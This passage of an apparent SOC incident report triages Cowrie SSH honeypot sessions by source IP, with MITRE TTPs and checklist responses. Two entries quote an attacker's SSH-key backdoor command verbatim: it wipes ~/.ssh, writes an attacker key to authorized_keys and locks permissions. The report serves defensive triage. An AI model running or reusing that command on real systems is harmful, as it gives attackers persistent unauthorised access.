- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-194e75c97f0b

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:28 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:28:59` | `cowrie.session.connect` |
| `2026-08-20 19:29:00` | `cowrie.client.version` |
| `2026-08-20 19:29:05` | `cowrie.client.kex` |
| `2026-08-20 19:29:21` | `cowrie.login.success` |
| `2026-08-20 19:29:27` | `cowrie.session.params` |
| `2026-08-20 19:29:27` | `cowrie.command.input` |
| `2026-08-20 19:29:30` | `cowrie.log.closed` |
| `2026-08-20 19:29:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5dbeec8c5a59

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:29 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:29:00` | `cowrie.session.connect` |
| `2026-08-20 19:29:00` | `cowrie.client.version` |
| `2026-08-20 19:29:04` | `cowrie.client.kex` |
| `2026-08-20 19:29:19` | `cowrie.login.success` |
| `2026-08-20 19:29:30` | `cowrie.session.params` |
| `2026-08-20 19:29:30` | `cowrie.command.input` |
| `2026-08-20 19:29:32` | `cowrie.log.closed` |
| `2026-08-20 19:29:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a19c6419dd6

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:29 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:29:05` | `cowrie.session.connect` |
| `2026-08-20 19:29:10` | `cowrie.client.version` |
| `2026-08-20 19:29:16` | `cowrie.client.kex` |
| `2026-08-20 19:29:30` | `cowrie.login.success` |
| `2026-08-20 19:29:36` | `cowrie.session.params` |
| `2026-08-20 19:29:36` | `cowrie.command.input` |
| `2026-08-20 19:29:36` | `cowrie.log.closed` |
| `2026-08-20 19:29:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d1f82c04ba9

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:29 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:29:10` | `cowrie.session.connect` |
| `2026-08-20 19:29:11` | `cowrie.client.version` |
| `2026-08-20 19:29:16` | `cowrie.client.kex` |
| `2026-08-20 19:29:30` | `cowrie.login.success` |
| `2026-08-20 19:29:36` | `cowrie.session.params` |
| `2026-08-20 19:29:36` | `cowrie.command.input` |
| `2026-08-20 19:29:36` | `cowrie.log.closed` |
| `2026-08-20 19:29:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d555de2588f5

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:29 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:29:10` | `cowrie.session.connect` |
| `2026-08-20 19:29:11` | `cowrie.client.version` |
| `2026-08-20 19:29:16` | `cowrie.client.kex` |
| `2026-08-20 19:29:29` | `cowrie.login.success` |
| `2026-08-20 19:29:35` | `cowrie.session.params` |
| `2026-08-20 19:29:35` | `cowrie.command.input` |
| `2026-08-20 19:29:36` | `cowrie.log.closed` |
| `2026-08-20 19:29:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd09128e29aa

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:29 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:29:10` | `cowrie.session.connect` |
| `2026-08-20 19:29:11` | `cowrie.client.version` |
| `2026-08-20 19:29:16` | `cowrie.client.kex` |
| `2026-08-20 19:29:27` | `cowrie.login.success` |
| `2026-08-20 19:29:32` | `cowrie.session.params` |
| `2026-08-20 19:29:32` | `cowrie.command.input` |
| `2026-08-20 19:29:33` | `cowrie.log.closed` |
| `2026-08-20 19:29:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81ffa9e04e12

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:29 |
| **Last Seen** | 2026-08-20 19:29 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:29:10` | `cowrie.session.connect` |
| `2026-08-20 19:29:11` | `cowrie.client.version` |
| `2026-08-20 19:29:16` | `cowrie.client.kex` |
| `2026-08-20 19:29:28` | `cowrie.login.success` |
| `2026-08-20 19:29:34` | `cowrie.session.params` |
| `2026-08-20 19:29:34` | `cowrie.command.input` |
| `2026-08-20 19:29:36` | `cowrie.log.closed` |
| `2026-08-20 19:29:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a08a860f69c4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 19:31 |
| **Last Seen** | 2026-08-20 19:32 |
| **Session Duration** | 56s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:31:44` | `cowrie.session.connect` |
| `2026-08-20 19:31:44` | `cowrie.client.version` |
| `2026-08-20 19:31:46` | `cowrie.client.kex` |
| `2026-08-20 19:31:49` | `cowrie.login.success` |
| `2026-08-20 19:31:49` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:32:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 19:32:41` | `cowrie.direct-tcpip.data` |
| `2026-08-20 19:32:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3c28fc4c1d66

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 19:31 |
| **Last Seen** | 2026-08-20 19:32 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:31:59` | `cowrie.session.connect` |
| `2026-08-20 19:31:59` | `cowrie.client.version` |
| `2026-08-20 19:31:59` | `cowrie.client.kex` |
| `2026-08-20 19:32:01` | `cowrie.login.success` |
| `2026-08-20 19:32:08` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:32:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2742afbac5c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-20 19:34 |
| **Last Seen** | 2026-08-20 19:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:34:17` | `cowrie.session.connect` |
| `2026-08-20 19:34:17` | `cowrie.client.version` |
| `2026-08-20 19:34:17` | `cowrie.client.kex` |
| `2026-08-20 19:34:17` | `cowrie.login.success` |
| `2026-08-20 19:34:17` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:34:17` | `cowrie.direct-tcpip.data` |
| `2026-08-20 19:34:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e85fdc615ca3

| Field | Detail |
|---|---|
| **Source IP** | `186.96.158[.]180` |
| **First Seen** | 2026-08-20 19:40 |
| **Last Seen** | 2026-08-20 19:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:40:15` | `cowrie.session.connect` |
| `2026-08-20 19:40:15` | `cowrie.client.version` |
| `2026-08-20 19:40:15` | `cowrie.client.kex` |
| `2026-08-20 19:40:16` | `cowrie.login.success` |
| `2026-08-20 19:40:17` | `cowrie.session.params` |
| `2026-08-20 19:40:17` | `cowrie.command.input` |
| `2026-08-20 19:40:17` | `cowrie.command.failed` |
| `2026-08-20 19:40:17` | `cowrie.log.closed` |
| `2026-08-20 19:40:18` | `cowrie.session.params` |
| `2026-08-20 19:40:18` | `cowrie.command.input` |
| `2026-08-20 19:40:18` | `cowrie.session.file_download` |
| `2026-08-20 19:40:18` | `cowrie.log.closed` |
| `2026-08-20 19:40:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.158[.]180` to AbuseIPDB if not already reported
- [ ] Block `186.96.158[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9557dbe5c271

| Field | Detail |
|---|---|
| **Source IP** | `186.96.158[.]180` |
| **First Seen** | 2026-08-20 19:40 |
| **Last Seen** | 2026-08-20 19:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:40:18` | `cowrie.session.connect` |
| `2026-08-20 19:40:19` | `cowrie.client.version` |
| `2026-08-20 19:40:19` | `cowrie.client.kex` |
| `2026-08-20 19:40:19` | `cowrie.login.success` |
| `2026-08-20 19:40:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.158[.]180` to AbuseIPDB if not already reported
- [ ] Block `186.96.158[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-176053f4e577

| Field | Detail |
|---|---|
| **Source IP** | `186.96.158[.]180` |
| **First Seen** | 2026-08-20 19:40 |
| **Last Seen** | 2026-08-20 19:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:40:19` | `cowrie.session.connect` |
| `2026-08-20 19:40:19` | `cowrie.client.version` |
| `2026-08-20 19:40:19` | `cowrie.client.kex` |
| `2026-08-20 19:40:20` | `cowrie.login.success` |
| `2026-08-20 19:40:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.96.158[.]180` to AbuseIPDB if not already reported
- [ ] Block `186.96.158[.]180` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1690bc8cde32

| Field | Detail |
|---|---|
| **Source IP** | `104.243.42[.]167` |
| **First Seen** | 2026-08-20 19:40 |
| **Last Seen** | 2026-08-20 19:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:40:59` | `cowrie.session.connect` |
| `2026-08-20 19:40:59` | `cowrie.client.version` |
| `2026-08-20 19:40:59` | `cowrie.client.kex` |
| `2026-08-20 19:40:59` | `cowrie.login.success` |
| `2026-08-20 19:41:00` | `cowrie.session.params` |
| `2026-08-20 19:41:00` | `cowrie.command.input` |
| `2026-08-20 19:41:00` | `cowrie.command.failed` |
| `2026-08-20 19:41:00` | `cowrie.log.closed` |
| `2026-08-20 19:41:01` | `cowrie.session.params` |
| `2026-08-20 19:41:01` | `cowrie.command.input` |
| `2026-08-20 19:41:01` | `cowrie.session.file_download` |
| `2026-08-20 19:41:01` | `cowrie.log.closed` |
| `2026-08-20 19:41:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.243.42[.]167` to AbuseIPDB if not already reported
- [ ] Block `104.243.42[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5810bb039cc1

| Field | Detail |
|---|---|
| **Source IP** | `104.243.42[.]167` |
| **First Seen** | 2026-08-20 19:41 |
| **Last Seen** | 2026-08-20 19:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:41:01` | `cowrie.session.connect` |
| `2026-08-20 19:41:01` | `cowrie.client.version` |
| `2026-08-20 19:41:01` | `cowrie.client.kex` |
| `2026-08-20 19:41:01` | `cowrie.login.success` |
| `2026-08-20 19:41:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.243.42[.]167` to AbuseIPDB if not already reported
- [ ] Block `104.243.42[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-477e2d4ced1c

| Field | Detail |
|---|---|
| **Source IP** | `104.243.42[.]167` |
| **First Seen** | 2026-08-20 19:41 |
| **Last Seen** | 2026-08-20 19:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:41:01` | `cowrie.session.connect` |
| `2026-08-20 19:41:01` | `cowrie.client.version` |
| `2026-08-20 19:41:01` | `cowrie.client.kex` |
| `2026-08-20 19:41:01` | `cowrie.login.success` |
| `2026-08-20 19:41:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.243.42[.]167` to AbuseIPDB if not already reported
- [ ] Block `104.243.42[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25d1870f5fb0

| Field | Detail |
|---|---|
| **Source IP** | `101.13.5[.]50` |
| **First Seen** | 2026-08-20 19:41 |
| **Last Seen** | 2026-08-20 19:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:41:05` | `cowrie.session.connect` |
| `2026-08-20 19:41:06` | `cowrie.client.version` |
| `2026-08-20 19:41:06` | `cowrie.client.kex` |
| `2026-08-20 19:41:09` | `cowrie.login.success` |
| `2026-08-20 19:41:09` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:41:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.5[.]50` to AbuseIPDB if not already reported
- [ ] Block `101.13.5[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f2bda20de21

| Field | Detail |
|---|---|
| **Source IP** | `202.72.196[.]75` |
| **First Seen** | 2026-08-20 19:41 |
| **Last Seen** | 2026-08-20 19:46 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:41:16` | `cowrie.session.connect` |
| `2026-08-20 19:41:16` | `cowrie.client.version` |
| `2026-08-20 19:41:16` | `cowrie.client.kex` |
| `2026-08-20 19:41:18` | `cowrie.login.success` |
| `2026-08-20 19:41:19` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:46:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.72.196[.]75` to AbuseIPDB if not already reported
- [ ] Block `202.72.196[.]75` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-072376feb85c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 19:43 |
| **Last Seen** | 2026-08-20 19:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:43:08` | `cowrie.session.connect` |
| `2026-08-20 19:43:08` | `cowrie.client.version` |
| `2026-08-20 19:43:09` | `cowrie.client.kex` |
| `2026-08-20 19:43:13` | `cowrie.login.success` |
| `2026-08-20 19:43:15` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:43:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 19:43:18` | `cowrie.direct-tcpip.data` |
| `2026-08-20 19:43:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-748fc63e4150

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-20 19:43 |
| **Last Seen** | 2026-08-20 19:45 |
| **Session Duration** | 106s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:43:22` | `cowrie.session.connect` |
| `2026-08-20 19:43:22` | `cowrie.client.version` |
| `2026-08-20 19:43:22` | `cowrie.client.kex` |
| `2026-08-20 19:43:24` | `cowrie.login.success` |
| `2026-08-20 19:43:26` | `cowrie.direct-tcpip.request` |
| `2026-08-20 19:45:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-20 19:45:08` | `cowrie.direct-tcpip.data` |
| `2026-08-20 19:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42b2406718fb

| Field | Detail |
|---|---|
| **Source IP** | `138.68.101[.]246` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:00` | `cowrie.session.connect` |
| `2026-08-20 19:44:06` | `cowrie.login.success` |
| `2026-08-20 19:44:07` | `cowrie.session.params` |
| `2026-08-20 19:44:11` | `cowrie.log.closed` |
| `2026-08-20 19:44:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.101[.]246` to AbuseIPDB if not already reported
- [ ] Block `138.68.101[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2c006b91204

| Field | Detail |
|---|---|
| **Source IP** | `138.68.101[.]246` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:17` | `cowrie.session.connect` |
| `2026-08-20 19:44:17` | `cowrie.login.success` |
| `2026-08-20 19:44:17` | `cowrie.session.params` |
| `2026-08-20 19:44:22` | `cowrie.log.closed` |
| `2026-08-20 19:44:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.101[.]246` to AbuseIPDB if not already reported
- [ ] Block `138.68.101[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a1c1f92e2a0

| Field | Detail |
|---|---|
| **Source IP** | `138.68.101[.]246` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:22` | `cowrie.session.connect` |
| `2026-08-20 19:44:22` | `cowrie.login.success` |
| `2026-08-20 19:44:22` | `cowrie.session.params` |
| `2026-08-20 19:44:27` | `cowrie.log.closed` |
| `2026-08-20 19:44:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.68.101[.]246` to AbuseIPDB if not already reported
- [ ] Block `138.68.101[.]246` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-082d3780f43c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:44:22` | `cowrie.session.connect` |
| `2026-08-20 19:44:22` | `cowrie.client.version` |
| `2026-08-20 19:44:23` | `cowrie.client.kex` |
| `2026-08-20 19:44:23` | `cowrie.login.success` |
| `2026-08-20 19:44:24` | `cowrie.session.params` |
| `2026-08-20 19:44:24` | `cowrie.command.input` |
| `2026-08-20 19:44:24` | `cowrie.log.closed` |
| `2026-08-20 19:44:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.240[.]161` to AbuseIPDB if not already reported
- [ ] Block `217.60.240[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b35f257e76a

| Field | Detail |
|---|---|
| **Source IP** | `217.60.240[.]161` |
| **First Seen** | 2026-08-20 19:44 |
| **Last Seen** | 2026-08-20 19:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST` |
